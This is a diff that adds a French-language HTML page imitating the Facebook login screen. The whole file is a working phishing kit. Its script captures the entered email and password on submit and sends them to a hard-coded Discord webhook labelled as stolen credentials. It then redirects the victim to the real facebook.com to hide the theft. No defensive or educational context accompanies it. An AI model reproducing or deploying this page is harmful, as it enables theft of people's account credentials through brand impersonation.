@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Facebook</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background-color: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        h1 { color: #1877f2; font-size: 40px; margin-bottom: 20px; font-weight: bold; }
+        input { width: 90%; padding: 14px 8px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #166fe5; }
+        a { display: block; margin-top: 15px; color: #1877f2; text-decoration: none; font-size: 14px; }
+        .loader { display: none; border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 20px; height: 20px; animation: spin 2s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>facebook</h1>
+    <!-- IMPORTANT : L'action pointe vers nous-mêmes via JS -->
+    <form id="loginForm">
+        <input type="text" id="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
+        <input type="password" id="pass" name="pass" placeholder="Mot de passe" required>
+        <button type="submit" id="btn">Se connecter</button>
+    </form>
+    <div class="loader" id="loader"></div>
+    <a href="#">Mot de passe oublié ?</a>
+</div>
+
+<script>
+    // REMPLACE PAR TON URL WEBHOOK DISCORD
+    const webhookUrl = 'https://discord.com/api/webhooks/1558226528188244159/4DBk9jSwM9vbEo-_6NqvwEnfjv8A1DUyn1YYl1eQdGhtRcPgaS2Bn5wnvzZJnvMEG4Sh'; 
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault(); 
+        
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        
+        document.getElementById('btn').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+
+        // Envoi à Discord
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: "🚨 **LOGIN CAPTURÉ !** 🚨",
+                embeds: [{
+                    title: "Identifiants volés",
+                    color: 15158332,
+                    fields: [
+                        { name: "📧 Email", value: email, inline: true },
+                        { name: "🔑 MDP", value: pass, inline: true }
+                    ]
+                }]
+            })
+        }).catch(err => console.error("Erreur Discord:", err));
+
+        // Redirection après 1.5 seconde
+        setTimeout(() => {
+            window.location.href = "https://www.facebook.com/";
+        }, 1500);
+    });
+</script>
+
+</body>
+</html>
